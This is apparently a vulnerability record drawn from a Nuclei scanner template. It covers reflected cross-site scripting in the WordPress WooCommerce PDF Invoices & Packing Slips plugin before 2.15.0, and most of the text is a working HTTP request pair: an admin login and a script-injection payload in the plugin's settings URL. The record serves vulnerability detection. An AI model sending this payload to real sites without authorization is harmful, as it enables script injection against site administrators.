# Vulnerability: WordPress WooCommerce PDF Invoices & Packing Slips <2.15.0 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`woocommerce-pdf-invoices-xss.yaml`)

## Description
WordPress WooCommerce PDF Invoices & Packing Slips 2.15.0 does not escape some URLs before outputting them in attributes, leading to reflected cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

